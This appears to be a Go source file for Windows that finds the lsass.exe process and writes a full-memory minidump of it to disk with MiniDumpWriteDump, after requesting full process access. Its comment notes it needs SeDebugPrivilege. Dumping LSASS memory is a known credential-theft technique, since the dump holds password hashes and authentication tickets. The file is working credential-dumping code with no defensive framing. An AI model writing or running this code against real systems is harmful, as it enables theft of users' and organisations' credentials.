//go:build windows

package main

import (
	"fmt"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

const miniDumpWithFullMemory uint32 = 0x00000002

// dumpLSASS writes a full-memory minidump of lsass.exe to outPath.
// Requires SeDebugPrivilege (run as SYSTEM or elevated admin).
func dumpLSASS(outPath string) error {
	// Find lsass PID
	pid, err := findProcessByName("lsass.exe")
	if err != nil {
		return fmt.Errorf("lsass not found: %w", err)
	}

	hProc, err := windows.OpenProcess(processAllAccess, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(lsass): %w", err)
	}
	defer windows.CloseHandle(hProc)

	f, err := os.Create(outPath)
	if err != nil {
		return fmt.Errorf("create(%s): %w", outPath, err)
	}
	defer f.Close()

	// MiniDumpWriteDump(hProcess, pid, hFile, dumpType, ExceptionParam, UserStreamParam, CallbackParam)
	r, _, e := procMiniDumpWriteDump.Call(
		uintptr(hProc),
		uintptr(pid),
		uintptr(f.Fd()),
		uintptr(miniDumpWithFullMemory),
		0, 0, 0,
	)
	if r == 0 {
		return fmt.Errorf("MiniDumpWriteDump: %v", e)
	}
	return nil
}

// findProcessByName returns the first PID matching name (case-insensitive).
func findProcessByName(name string) (uint32, error) {
	hSnap, _, e := procCreateToolhelp32Snapshot.Call(uintptr(th32csSnapProcess), 0)
	if hSnap == ^uintptr(0) {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot: %v", e)
	}
	defer windows.CloseHandle(windows.Handle(hSnap))

	type PROCESSENTRY32W struct {
		dwSize              uint32
		cntUsage            uint32
		th32ProcessID       uint32
		th32DefaultHeapID   uintptr
		th32ModuleID        uint32
		cntThreads          uint32
		th32ParentProcessID uint32
		pcPriClassBase      int32
		dwFlags             uint32
		szExeFile           [260]uint16
	}

	pe := PROCESSENTRY32W{dwSize: uint32(unsafe.Sizeof(PROCESSENTRY32W{}))}
	r, _, e := procProcess32First.Call(hSnap, uintptr(unsafe.Pointer(&pe)))
	if r == 0 {
		return 0, fmt.Errorf("Process32First: %v", e)
	}

	nameLower := toLower(name)
	for {
		exeName := windows.UTF16ToString(pe.szExeFile[:])
		if toLower(exeName) == nameLower {
			return pe.th32ProcessID, nil
		}
		r, _, _ = procProcess32Next.Call(hSnap, uintptr(unsafe.Pointer(&pe)))
		if r == 0 {
			break
		}
	}
	return 0, fmt.Errorf("process %q not found", name)
}

func toLower(s string) string {
	b := []byte(s)
	for i, c := range b {
		if c >= 'A' && c <= 'Z' {
			b[i] = c + 32
		}
	}
	return string(b)
}
